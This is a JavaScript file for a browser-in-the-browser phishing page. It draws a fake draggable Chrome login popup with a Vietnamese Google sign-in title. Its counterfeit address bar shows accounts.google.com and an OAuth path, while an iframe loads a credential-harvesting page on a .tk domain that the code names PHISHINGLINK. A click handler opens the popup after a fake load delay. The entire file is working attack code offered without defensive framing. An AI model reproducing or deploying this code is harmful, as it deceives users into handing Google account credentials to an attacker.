const loadTITLE = "Đăng nhập";
const TITLE = "Đăng nhập - Tài khoản Google - Google Chrome";
const loadDOMAINNAME = "";
const DOMAINNAME = "https://accounts.google.com/";
const loadDOMAINPATH = "about:blank";
const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
const PHISHINGLINK = "https://www.ltp110.tk/google-login/";
const loadTIME = 1000;

var titleBar = document.getElementById("title-bar");
var exit = document.getElementById("exit");
var max = document.getElementById("maximize");
var min = document.getElementById("minimize");

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});

//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////

init();
document.querySelector("#content").src = PHISHINGLINK;

////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function () {
  $("#window").css("display", "none");
  init();
  $("#content").css("visibility", "hidden");
});

// Maximize button functionality
$("#maximize").click(enlarge);

function enlarge(){
  if(max.classList.contains("enlarged")){
    $("#window").css("width", "40%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#maximize").removeClass("enlarged");
  }
  else{
    $("#window").css("width", "70%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#maximize").addClass("enlarged");
  }
}

$("#clickme").click(function () {
  $("#window").css("display", "block");
  setTimeout(loaded, loadTIME);
});

function loaded() {
  document.querySelector("#logo-description").textContent = TITLE;
  document.querySelector("#domain-name").textContent = DOMAINNAME;
  document.querySelector("#domain-path").textContent = DOMAINPATH;
  $("#content").css("visibility", "visible");
}

function init(){
  document.querySelector("#logo-description").textContent = loadTITLE;
  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
}
